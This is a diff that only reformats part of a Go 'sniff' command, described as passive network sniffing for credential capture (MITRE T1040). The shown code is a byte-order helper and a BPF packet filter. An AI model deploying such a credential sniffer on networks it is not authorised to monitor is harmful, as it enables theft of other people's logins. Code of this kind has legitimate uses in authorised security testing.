@@ -18,8 +18,10 @@ import (
 
 type SniffCommand struct{}
 
-func (c *SniffCommand) Name() string        { return "sniff" }
-func (c *SniffCommand) Description() string { return "Passive network sniffing for credential capture (T1040)" }
+func (c *SniffCommand) Name() string { return "sniff" }
+func (c *SniffCommand) Description() string {
+	return "Passive network sniffing for credential capture (T1040)"
+}
 
 func sniffHtons(i uint16) uint16 {
 	return (i<<8)&0xff00 | i>>8
@@ -220,13 +222,13 @@ func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
 	// Accept IPv4 TCP (proto 6) or UDP (proto 17) packets.
 	// Port filtering is done in userspace since BPF port offsets differ for TCP vs UDP.
 	return []unix.SockFilter{
-		{Code: 0x28, K: 12},                              // ldh [12] — EtherType
-		{Code: 0x15, Jt: 0, Jf: 4, K: 0x0800},           // jeq #0x0800, next, drop
-		{Code: 0x30, K: 23},                              // ldb [23] — IP protocol
-		{Code: 0x15, Jt: 1, Jf: 0, K: 6},                // jeq #6 (TCP), accept
-		{Code: 0x15, Jt: 0, Jf: 1, K: 17},               // jeq #17 (UDP), accept, drop
-		{Code: 0x06, K: 0xFFFFFFFF},                      // ret #-1 (accept)
-		{Code: 0x06, K: 0},                               // ret #0 (drop)
+		{Code: 0x28, K: 12},                   // ldh [12] — EtherType
+		{Code: 0x15, Jt: 0, Jf: 4, K: 0x0800}, // jeq #0x0800, next, drop
+		{Code: 0x30, K: 23},                   // ldb [23] — IP protocol
+		{Code: 0x15, Jt: 1, Jf: 0, K: 6},      // jeq #6 (TCP), accept
+		{Code: 0x15, Jt: 0, Jf: 1, K: 17},     // jeq #17 (UDP), accept, drop
+		{Code: 0x06, K: 0xFFFFFFFF},           // ret #-1 (accept)
+		{Code: 0x06, K: 0},                    // ret #0 (drop)
 	}
 }
 
